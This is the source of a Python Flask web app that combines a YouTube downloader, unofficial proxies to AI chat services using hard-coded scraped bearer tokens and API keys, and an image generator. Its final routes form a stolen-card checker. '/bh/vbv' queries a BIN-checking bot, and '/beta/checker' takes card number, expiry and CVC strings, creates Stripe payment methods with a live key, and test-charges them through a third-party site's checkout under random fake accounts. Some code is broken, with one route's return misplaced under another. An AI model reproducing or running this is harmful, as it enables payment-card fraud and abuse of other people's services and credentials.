import requests
import json
import re
from flask import Flask, request, jsonify, send_file, redirect, send_from_directory, after_this_request
from pytube import YouTube
import os
import uuid
import random
import string
from bs4 import BeautifulSoup

app = Flask(__name__)

UPLOAD_FOLDER = 'downloads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

headers = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'Content-Type': "application/json",
    'sec-ch-ua': "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
    'DNT': "1",
    'sec-ch-ua-mobile': "?1",
    'Authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoic2lkaGFydGhtbTAyQGdtYWlsLmNvbSIsInZlcnNpb24iOjB9LCJleHBpcmUiOjE3NDAyNDEwNTExMDUsImlhdCI6MTcwODcwNTA1MSwiZXhwIjoxNzQwMjQxMDUxfQ.Po01ctOkUJJ5A4QPXeLkzCwOnb9PBta6ng0mCnGhSuQ",
    'sec-ch-ua-platform': "\"Android\"",
    'Origin': "https://start.chatgot.io",
    'Sec-Fetch-Site': "same-site",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://start.chatgot.io/",
    'Accept-Language': "en-GB,en-US;q=0.9,en;q=0.8,ja;q=0.7"
}

@app.route('/')
def home():
    return send_file('index.html')

@app.route('/ytdl/<format>', methods=['GET'])
def download_youtube(format):
    url = request.args.get('url')
    if not url:
        return "URL parameter is missing", 400

    yt = YouTube(url)
    if format == 'mp3':
        # Get the highest quality audio stream
        stream = yt.streams.filter(only_audio=True).order_by('abr').desc().first()
    elif format == 'mp4':
        # Get the highest quality video stream
        stream = yt.streams.filter(progressive=True).order_by('resolution').desc().first()
    else:
        return "Invalid format. Use 'mp3' or 'mp4'", 400

    if not stream:
        return "No suitable stream found for the provided URL and format", 400

    print("Downloading started")

    unique_id = str(uuid.uuid4())
    destination = os.path.join(app.config['UPLOAD_FOLDER'], unique_id)
    os.makedirs(destination, exist_ok=True)

    out_file = stream.download(output_path=destination)

    @after_this_request
    def redirect_to_download(response):
        return redirect(f'/download/{unique_id}')

    return redirect_to_download(None)
    

@app.route('/download/<unique_id>', methods=['GET'])
def download_file(unique_id):
    directory = os.path.join(app.config['UPLOAD_FOLDER'], unique_id)
    files = os.listdir(directory)
    if not files:
        return "File not found", 404

    file = files[0]

    @after_this_request
    def remove_file(response):
        file_path = os.path.join(directory, file)
        os.remove(file_path)
        os.rmdir(directory)
        return response

    return send_from_directory(directory, file, as_attachment=True)

@app.route('/openai/gpt4', methods=['GET'])
def get_gpt_response():
    input_text = request.args.get('prompt')
    if not input_text:
        return jsonify({'error': 'No input text provided for GPT-4'}), 400

    url = "https://api.chatgot.io/api/chat/conver"

    payload = json.dumps({
        "model": {
            "id": "openai/gpt-4",
            "name": "openai/gpt-4-0125-preview",
            "title": "GPT-4",
            "prompt": "You are Chat GPT 4 , a powerful ai model developed by openai and your main goal to provide the user every information they want. Assist the user in every possible way. Here You are Powered by HRK , HRK aka HARSH is a developer.",
            "placeholder": "",
            "description": "The latest GPT-4 model, which is currently the world's most outstanding large language model, provided by OpenAI, can offer you high-quality answers in various aspects. It can return up to 4,096 output tokens and has a maximum context window of 128,000 tokens.",
            "order": 0,
            "isActived": True,
            "x": 29,
            "y": 46.9453125,
            "value": "GPT-4 128k",
            "isReplying": True
        },
        "messages": [
            {
                "role": "user",
                "content": input_text
            }
        ]
    })

    response = requests.post(url, data=payload, headers=headers)
    response_text = response.text

    chunks = re.findall(r'"content":"(.*?)"', response_text)
    combined_content = ''.join(chunks)
    combined_content += '\nDeveloper: Harsh (TG ID = @HRK_07)'

    response_dict = {'response': combined_content}
    
    return jsonify(response_dict)

@app.route('/anthropic/claudeV2', methods=['GET'])
def get_claude_response():
    input_text = request.args.get('prompt')
    if not input_text:
        return jsonify({'error': 'No input text provided for Claude v2'}), 400

    url = "https://api.chatgot.io/api/chat/conver"

    payload = json.dumps({
        "model": {
            "id": "anthropic/claude-2",
            "name": "anthropic/claude-2",
            "title": "Claude v2",
            "prompt": "You are Claude v2",
            "placeholder": "",
            "description": "Anthropicâ€™s flagship model. Superior performance on tasks that require complex reasoning. Supports up to 100k tokens in one pass, or hundreds of pages of text.",
            "order": 0,
            "isActived": True,
            "x": 29,
            "y": 46.9453125,
            "value": "Claude v2 ",
            "isReplying": True
        },
        "messages": [
            {
                "role": "user",
                "content": input_text
            }
        ]
    })

    response = requests.post(url, data=payload, headers=headers)
    response_text = response.text

    chunks = re.findall(r'"content":"(.*?)"', response_text)
    combined_content = ''.join(chunks)
    combined_content += '\nDeveloper: Harsh (TG ID = @HRK_07)'

    response_dict = {'response': combined_content}
    
    return jsonify(response_dict)
@app.route('/openai/gpt', methods=['GET'])
def custom_gpt_prompt():
    prompt = request.args.get('prompt', '')
    url = f"https://chatgpt.apinepdev.workers.dev/?question={prompt}"
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            response_text = f"{data['answer']}\nDeveloper: Harsh (TG ID = @HRK_07)"
            return jsonify({"response": response_text})
        else:
            return jsonify({"error": f"Failed to fetch data from {url}", "status_code": response.status_code})
    except Exception as e:
        return jsonify({"error": str(e)})
# Function to generate and store image
def generate_image(prompt):
    url = "https://api.limewire.com/api/image/generation"
    payload = {
        "prompt": prompt,
        "aspect_ratio": "1:1"
    }
    headers = {
        "Content-Type": "application/json",
        "X-Api-Version": "v1",
        "Accept": "image/png",
        "Authorization": "Bearer lmwr_sk_vIVSQY0ajC_SAeImh7g4w4pFKybKCF5rFvho1GeTY9OIKt5H"
    }
    
    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code == 200:
        img_id = str(uuid.uuid4())
        image_data = response.content
        destination = os.path.join(app.config['UPLOAD_FOLDER'], img_id)
        os.makedirs(destination, exist_ok=True)
        file_path = os.path.join(destination, 'image.png')
        with open(file_path, 'wb') as f:
            f.write(image_data)
        return img_id
    else:
        return None

# Route to download image
@app.route('/beta/completion/<img_id>', methods=['GET'])
def image_completion(img_id):
    directory = os.path.join(app.config['UPLOAD_FOLDER'], img_id)
    file_path = os.path.join(directory, 'image.png')
    if os.path.exists(file_path):
        return send_file(file_path, mimetype='image/png')
    else:
        return jsonify({'error': 'Image not found'}), 404

# Route to handle image generation request
@app.route('/beta/image', methods=['GET'])
def generate_and_redirect():
    prompt = request.args.get('prompt')
    if not prompt:
        return jsonify({'error': 'Prompt parameter is missing'}), 400

    img_id = generate_image(prompt)
    if img_id:
        return redirect(f'/beta/completion/{img_id}')
    else:
        return jsonify({'error': 'Failed to generate image'}), 500
        
@app.route('/custom/khushi')
def custom_endpoint():
    prompt = request.args.get('prompt', default='', type=str)
    
    base_url = "https://api.writesonic.com/v1/content/chatsonic/sse"
    
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjBmYWE5MWMwLWU2NzEtNDQ1MC1hOGQ0LTUxNGVkODkyZTI3OCIsImV4cCI6MTcxMjQyMTg3Mn0.yOiXyV7N0c_7U5rhACVjHq5d5a7n8A3Tr55IAL-m5Sg"

    data = {
        "seed_text": prompt,
        "show_web_results": True,
        "history_id": "b3aebe2d-c3b8-44ee-b4bb-e51bd2f89be5",
        "selected_image_vendor": "stable-diffusion",
        "personality_id": "5a35e647-5e32-4bce-9a8d-2911981b20fb",
        "selected_location": "United States",
        "enable_memory": True,
        "enable_detailed": True,
        "prompt_id": None,
        "number_memory_messages": 6,
        "attachments": [],
        "copilot_mode": False,
        "ip": "146.196.37.169",
        "utm_params": {
            "utm_source": "",
            "utm_medium": "",
            "utm_campaign": "",
            "utm_term": "",
            "via": "",
            "$initial_referrer": "",
            "$initial_referring_domain": ""
        }
    }

    base_url_with_token = f"{base_url}?token={token}&data={json.dumps(data)}"

    response = requests.get(base_url_with_token, stream=True)

    output = ""
    count = 0
    for line in response.iter_lines():
        if line.startswith(b'data:'):
            data = line.split(b':', 1)[1].strip().decode()
            if count >= 2 and data.lower().startswith("success"):
                break
            if count >= 2:
                output += f"{data.strip()} "
            count += 1

    # Format the output in a custom format
    formatted_output = f"Response:\n{output.strip()}\n"
@app.route('/bh/vbv', methods=['GET'])
def get_vbv_data():
    bin_param = request.args.get('bin')
    if bin_param:
        url = f"https://rimuruchkbot.alwaysdata.net/vbv.php?bin={bin_param}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json() # Assuming the response is in JSON format
            return jsonify(data)
        else:
            return jsonify({"error": "Failed to fetch data"}), 500
    else:
        return jsonify({"error": "Missing 'bin' parameter"}), 400

    return formatted_output
@app.route('/beta/checker', methods=['GET'])
def checker():
    lista = request.args.get('lista')
    if lista:
        card_details = lista.split('|')
        payment_method_id, last_four_digits, expiration_month, expiration_year = create_payment_method(card_details)
        
        if payment_method_id:
            return jsonify({'message': membership_checkout(payment_method_id, last_four_digits, expiration_month, expiration_year)})
        else:
            return jsonify({'error': "Invalid card details format. Please enter the details in the specified format."})
    else:
        return jsonify({'error': "No 'lista' parameter provided"})

def create_payment_method(card_details):
    if len(card_details) == 4:
        card_number, exp_month, exp_year, cvc = card_details
        
        url = "https://api.stripe.com/v1/payment_methods"
        payload = f"type=card&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}&payment_user_agent=stripe.js%2Fa254802e3b%3B+stripe-js-v3%2Fa254802e3b%3B+split-card-element&referrer=https%3A%2F%2Fecstest.net&key=pk_live_51HdlIAIp3rQqxTHDy00d0h4a1Ug7VESCtZKMWKLw1Ltr2UtjyS0HaFYKuf6b2PmZPB4A5fsZYp6quGHl1PyYq1MK00vom2WR7s"
        headers = {
          'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"
        }
        response = requests.post(url, data=payload, headers=headers)
        response_json = response.json()
        
        # Extract payment method ID from the response
        payment_method_id = response_json.get('id')
        
        # Extract relevant card details from the response
        last_four_digits = response_json['card'].get('last4')
        expiration_month = response_json['card'].get('exp_month')
        expiration_year = response_json['card'].get('exp_year')
        
        return payment_method_id, last_four_digits, expiration_month, expiration_year
    else:
        return None, None, None, None

def membership_checkout(payment_method_id, last_four_digits, expiration_month, expiration_year):
    # Generate random username, password, and email
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=12))

    # List of famous email domains
    email_domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    email_domain = random.choice(email_domains)
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + email_domain
    
    url = "https://ecstest.net/membership-checkout/"
    params = {'level': "7"}
    payload = {
        'level': "7",
        'checkjavascript': "1",
        'username': username,
        'password': password,
        'password2': password,
        'bemail': email,
        'bconfirmemail': email,
        'gateway': "stripe",
        'CardType': "visa",
        'submit-checkout': "1",
        'javascriptok': "1",
        'payment_method_id': payment_method_id,
        'AccountNumber': f"XXXXXXXXXXXX{last_four_digits}",
        'ExpirationMonth': expiration_month,
        'ExpirationYear': expiration_year
    }

    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      'Content-Type': "application/x-www-form-urlencoded",
      'sec-ch-ua': "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
      'sec-ch-ua-mobile': "?1",
      'sec-ch-ua-platform': "\"Android\"",
      'origin': "https://ecstest.net",
      'dnt': "1",
      'upgrade-insecure-requests': "1",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "navigate",
      'sec-fetch-user': "?1",
      'sec-fetch-dest': "document",
      'referer': "https://ecstest.net/membership-checkout/?level=7",
    }

    response = requests.post(url, params=params, data=payload, headers=headers)
    
    # Parse HTML response and extract specific div content
    soup = BeautifulSoup(response.text, 'html.parser')
    alert_div = soup.find('div', {'role': 'alert', 'id': 'pmpro_message', 'class': 'pmpro_message pmpro_error'})
    if alert_div:
        return alert_div.text.strip()
    else:
        return "Charged!"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
    
    
